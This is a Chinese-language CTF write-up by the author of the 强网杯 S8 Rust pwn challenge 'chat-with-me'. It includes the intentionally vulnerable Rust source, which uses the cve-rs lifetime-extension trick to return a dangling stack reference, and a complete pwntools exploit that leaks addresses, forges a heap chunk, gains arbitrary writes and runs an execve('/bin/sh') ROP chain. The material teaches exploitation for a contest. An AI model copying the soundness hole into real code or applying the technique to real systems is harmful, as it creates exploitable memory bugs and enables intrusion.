---
title: '[原创] 强网杯 S8 Rust Pwn chat-with-me 出题思路分享'
contest: 强网杯 S8 (强网杯 2024)
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags:
- rust_static_lifetime
- cve_rs_extension
- vec_realloc_arbitrary_addr
- msg_list_poisoning
- arb_write_via_rax_pop_rdi
- msg_static_mut_ref_lifetime_extension
- ctf_qwb_rust
- show_leak_addr
- rust_unsafe_misuse
attack_chain: Rust cve-rs UIUCTF 2024 Rusty Pointer POC + get_ptr 函数生命周期扩展返回 &'static mut Msg → add/show/edit/delete 5 菜单 (Vec<&'static mut Msg>) → show 0 泄 stack+elf+heap 地址 → edit(0) 伪造 0x91 堆块劫持 vec 指针数组 → arb_qword 任意写 8 字节 → 多轮 ROP 链写返回地址 → pop_rdi+pop_rsi+pop_rax+syscall execve /bin/sh
key_payload: 'const S: &&() = &&(); let f: fn(_, &''a mut T) -> &''b mut T = ident / vec 三指针 start/finish/end_of_storage realloc / arb_qword: edit(1, p64(0)*5+p64(0x51)+p64(addr)) + edit(0, qword) / ret_addr = stack_addr+0x3D0'
one_liner: 强网杯 S8 Rust Pwn chat-with-me：cve-rs 静态生命周期扩展 POC + Vec<&'static mut Msg> 指针数组劫持 + 任意 8 字节写 + ROP 链 execve /bin/sh。
lesson: Rust cve-rs 项目暴露了生命周期扩展的 UAF 漏洞；Vec 内部是 realloc 扩容的指针数组，可通过堆块伪造劫持；Rust PWN 出题关键是"如何在无 unsafe 的代码里构造漏洞"。
quality: high
full_path: '[原创]强网杯S8_Rust_Pwn_chat-with-me出题思路分享.full.md'
meta_path: '[原创]强网杯S8_Rust_Pwn_chat-with-me出题思路分享.meta.md'
images_removed: true
images_removed_count: 5
schema_version: v3.0.0-P0
summary: '[原创] 强网杯 S8 Rust Pwn chat-with-me 出题思路分享。强网杯 S8 Rust Pwn chat-with-me：cve-rs 静态生命周期扩展 POC + Vec<&''static mut Msg> 指针数组劫持 + 任意 8 字节写 + ROP 链 execve /bin/sh。。经验：Rust cve-rs 项目暴露了生命周期扩展的 UAF 漏洞；Vec 内部...'
category: pwn
subcategory: heap_exploitation
tools_used:
- ROP
- Rust
time_required: long
difficulty_score: 4
code_blocks_count: 0
images_count: 5
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/213624.html
reasoning_chain:
- 触发点:UIUCTF 2024 Rusty Pointer cve-rs POC + Rust 静态生命周期扩展 → 假设:可构造 UAF → 动作:引入 cve-rs get_ptr
- 动作:get_ptr 函数生命周期扩展返回 &'static mut Msg → 观察:Vec<&'static mut Msg> add/show/edit/delete 5 菜单
- 动作:show 0 泄 stack+elf+heap 地址 → 观察:地址完整
- 触发点:edit(0) 伪造 0x91 堆块 → 假设:劫持 Vec 指针数组 → 动作:vec 三指针 start/finish/end_of_storage realloc
- 动作:edit(1, p64(0)*5+p64(0x51)+p64(addr)) + edit(0, qword) → 观察:arb_qword 任意写 8 字节
- 动作:多轮 ROP 链写返回地址 → pop_rdi+pop_rsi+pop_rax+syscall execve /bin/sh → 观察:shell 触发
- 动作:ret_addr = stack_addr+0x3D0 → 完成
failed_attempts:
- 试图直接 UAF → 失败:Rust 无 unsafe 不让
- 试图不解 cve-rs POC → 失败:生命周期扩展是漏洞根源
- 试图单 8 字节写 ret → 失败:ROP 链必须多轮写
key_observations:
- Rust cve-rs 项目暴露了生命周期扩展的 UAF 漏洞
- Vec 内部是 realloc 扩容的指针数组,可通过堆块伪造劫持
- Rust PWN 出题关键是 '如何在无 unsafe 的代码里构造漏洞'
- arb_qword 任意 8 字节写 + 多轮 ROP 是 Rust PWN 利用套路
- edit(0) 伪造 0x91 堆块劫持 Vec 指针是 Rust 堆利用标准手法
prerequisites:
- Rust 生命周期扩展 + cve-rs POC
- Vec 内部结构 (start/finish/end_of_storage)
- ROP 链构造 + arb_qword 任意写
- Rust 堆布局 (Vec realloc)
---
# [原创]强网杯S8 Rust Pwn chat-with-me出题思路分享

> 原文: https://www.ctfiot.com/213624.html
> ID: 213624

出题思路

本题最终解数为42，因为题目难度不大，总体符合预期。题目是用rust写的代码，同时赛前夜里临时决定删除符号不给源码，一方面导致选手逆向难度很大，另一方面也让大部分选手把精力集中在动调上，避免陷入源码的细节。在出题过程中其实也没有漏洞和明确利用手法的考点，题目是一边学习一边调试的时候出出来的，再次把出题思路分享给大家，算是抛砖引玉。

这里还是首先给出源码（ rustc 1.82.0-nightly (cefe1dcef 2024-07-22) ）：

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

106

107

108

109

110

111

112

113

114

115

116

117

118

119

120

121

122

123

124

125

126

127

128

use std::
fmt;

use std::io::{self, Read, Write};

const MAX_MSG_LEN: usize = 0x50;

struct Msg {

data: [u8; MAX_MSG_LEN],

}

impl Msg {

#[inline(never)]

fn new() -> Self {

Msg {

data: [0; MAX_MSG_LEN],

}

}

}

impl fmt::
Display for Msg {

#[inline(never)]

fn fmt(&self, f: &mut fmt::
Formatter) -> fmt::
Result {

write!(f, "{:?}", self.data)

}

}

#[inline(never)]

fn prompt(msg: String) {

print!("{} > ", msg);

io::
stdout().flush().unwrap();

}

struct ChatBox {

msg_list: Vec<&'static mut Msg>,

}

impl ChatBox {

#[inline(never)]

fn new() -> Self {

ChatBox {

msg_list: Vec::
new(),

}

}

#[inline(never)]

fn add_msg(&mut self) {

println!("Adding a new message");

self.msg_list.push(self.get_ptr());

println!(

"Successfully added a new message with index: {}",

self.msg_list.len() - 1

);

}

#[inline(never)]

fn show_msg(&mut self) {

prompt("Index".parse().unwrap());

let mut index = String::
new();

io::
stdin().read_line(&mut index).expect("Failed to read");

let index: usize = index.trim().parse().expect("Invalid!");

println!("Content: {}", self.msg_list[index]);

}

#[inline(never)]

fn edit_msg(&mut self) {

prompt("Index".parse().unwrap());

let mut index = String::
new();

io::
stdin().read_line(&mut index).expect("Failed to read");

let index: usize = index.trim().parse().expect("Invalid!");

prompt("Content".parse().unwrap());

let mut handle = io::
stdin().lock();

handle.read(&mut self.msg_list[index].data).expect("Failed to read");

println!("Content: {}", self.msg_list[index]);

}

#[inline(never)]

fn delete_msg(&mut self) {

prompt("Index".parse().unwrap());

let mut index = String::
new();

io::
stdin().read_line(&mut index).expect("Failed to read");

let index: usize = index.trim().parse().expect("Invalid!");

self.msg_list.remove(index);

}

#[inline(never)]

fn get_ptr(&self) -> &'static mut Msg {

const S: &&() = &&();

fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {

fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {

val_b

}

let f: fn(_, &'a mut T) -> &'b mut T = ident;

f(S, x)

}

let mut msg = Msg::
new();

get_ptr(&mut msg)

}

}

#[inline(never)]

fn main() {

let mut chat_box = ChatBox::
new();

println!("I am a chatting bot of QWB S8, you can chat with me.");

println!("If you delight me, I will give you flag!");

println!("This is function menu: ");

println!("1. add");

println!("2. show");

println!("3. edit");

println!("4. delete");

println!("5. exit");

loop {

prompt("Choice".parse().unwrap());

let mut choice = String::
new();

io::
stdin().read_line(&mut choice).expect("Failed to read");

let choice: i8 = choice.trim().parse().expect("Invalid!");

match choice {

1 => chat_box.add_msg(),

2 => chat_box.show_msg(),

3 => chat_box.edit_msg(),

4 => chat_box.delete_msg(),

5 => break,

_ => println!("Invalid Choice!")

}

}

}

本题在构思的时候其实是想用不含unsafe的rust语言构造一个漏洞，因此一方面在RustSec上寻找合适的漏洞，另一方面发现了cve-rs项目。首先在RustSec找的漏洞不太适合出题，又限于出题时间和自身水平，最终还是选择用cve-rs内的原理，“盗用”了

UIUCTF 2024 Rusty Pointer题目的触发POC：

1

2

3

4

5

6

7

8

9

10

11

12

13

fn get_ptr(&self) -> &'static mut Msg {

const S: &&() = &&();

fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {

fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {

val_b

}

let f: fn(_, &'a mut T) -> &'b mut T = ident;

f(S, x)

}

let mut msg = Msg::
new();

get_ptr(&mut msg)

}

据我的理解，这段POC实际上是利用对变量静态生存周期的混淆，欺骗rust编译器不释放离开生存期的变量。

通过上述的技术原理，我们可以得到一个离开生存期仍然可用的指针（或者说对象），在此题中将其用到了栈上对象，因此我们可以获得一个get_ptr​函数内的一个栈对象msg​：

而每次add​的时候，由于函数调用的顺序不变，实际上每次申请得到的地址都是一样的。虽说这样让程序

逻辑有些奇怪，但是也让堆的可控变小了。另外，Msg​的大小变化其实会导致栈布局，包括该离开生命周期的栈指针的能力发生变化，有时可以直接写到返回地址，这太简单了肯定不行:)

1

const MAX_MSG_LEN: usize = 0x50;

解题思路

一血战队ACT的解法实际上跟我的预期解是一样的。通过show可以泄露栈上的堆地址、栈地址、ELF地址，通过edit​我们可以发现存在任意地址释放，但是问题在于怎样利用该能力实现栈地址写或者任意地址写。

我们现在手上有两个条件，首先是任意地址释放，其次是rust的vec​类似于C++，使用realloc​扩容，其指针数组也存储在堆上。

因此不难想到通过释放伪造堆块，将vec​的指针数组劫持到我们可控的位置，而我们可控的位置最直接的就是栈上0x50的空间，另一个是stdin的输入在堆上的缓冲区

实际上从选手做法来看，这两个位置都可以成功伪造堆块，实现控制vec​的指针。

这里给出我的exp：

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

106

107

108

109

110

111

112

113

114

115

116

117

118

119

120

121

122

123

124

125

126

127

#!/usr/bin/env python

"""

author: GeekCmore

time: 2024-10-30 17:06:06

"""

from pwn import *

filename = "/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn"

libcname = "/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"

host = "localhost"

port = 6666

elf = context.binary = ELF(filename)

if libcname:

libc = ELF(libcname)

gs = """

b *$rebase(0x1A979)

b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:
145

set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug

set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39

"""

def start():

if args.GDB:

return gdb.debug(elf.path, gdbscript=gs)

elif args.REMOTE:

return remote(host, port)

else:

return process(elf.path)

p = start()

def add():

p.sendlineafter(b"Choice > ", b"1")

def show(idx):

p.sendlineafter(b"Choice > ", b"2")

p.sendlineafter(b"Index > ", str(idx).encode())

def edit(idx, content):

p.sendlineafter(b"Choice > ", b"3")

p.sendlineafter(b"Index > ", str(idx).encode())

p.sendafter(b"Content > ", content)

def delete(idx):

p.sendlineafter(b"Choice > ", b"4")

p.sendlineafter(b"Index > ", str(idx).encode())

def quit():

p.sendlineafter(b"Choice > ", b"5")

def tidy():

p.recvuntil(b"Content: ")

y = p.recvline()[1:-2].decode().replace(" ", "").split(",")

values = []

for i in range(10):

tmp = 0

for j in range(8):

tmp += int(y[i * 8 + 7 - j])

tmp <<= 8

tmp >>= 8

values.append(tmp)

info([hex(x) for x in values])

return values

add()

show(0)

addr_list = tidy()

stack_addr = addr_list[4]

elf.address = addr_list[5] - 0x635B0

heap_addr = addr_list[1]

success(f"stack_addr -> {hex(stack_addr)}")

success(f"elf_addr -> {hex(elf.address)}")

success(f"heap_addr -> {hex(heap_addr)}")

fake_heap = p64(1) + p64(0x91) + p64(1) * 2 + p64(heap_addr - 0x2010) + p64(0x1FE1)

edit(0, fake_heap)

tidy()

# pause()

for _ in range(6):

add()

info("start")

def arb_qword(addr, qword):

edit(1, p64(0) * 5 + p64(0x51) + p64(addr))

info(f"Write {hex(u64(qword))} to [{hex(addr)}]")

edit(0, qword)

def arb_write(addr, content):

for i in range(0, len(content), 8):

arb_qword(addr + i, content[i : i + 8])

ret_addr = stack_addr + 0x3D0

syscall = elf.address + 0x0000000000026FCF

pop_rdi_rbp = elf.address + 0x000000000001DD45

pop_rsi_rbp = elf.address + 0x000000000001E032

pop_rax = elf.address + 0x0000000000016F3E

pop_rdx_xor_ptrax = elf.address + 0x0000000000045DC5

sub_rdx_rcx_add_rax_rcx = elf.address + 0x000000000001FC60

pop_rcx = elf.address + 0x0000000000017FFF

ret = elf.address + 0x0000000000016BD8

payload = b""

payload += p64(pop_rdi_rbp) + p64(ret_addr + 0x60) + p64(0)

payload += p64(pop_rsi_rbp) + p64(0) + p64(0)

payload += p64(pop_rcx) + p64(0x33)

payload += p64(sub_rdx_rcx_add_rax_rcx)

payload += p64(pop_rax) + p64(constants.SYS_execve)

payload += p64(syscall)

payload += b"/bin/sh\x00"

arb_write(ret_addr, payload)

quit()

p.interactive()

非预期思路

实际上在输入choice​的时候输入的字符会开辟新的堆空间存储，因此也有队伍把栈上伪造的堆释放到tcache，接着实现栈溢出。

此外还有选手发现delete​的时候实际上会申请堆块，这我就没有往下深入研究了。

原文始发于看雪社区（GeekCmore）：[原创]强网杯S8 Rust Pwn chat-with-me出题思路分享

---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]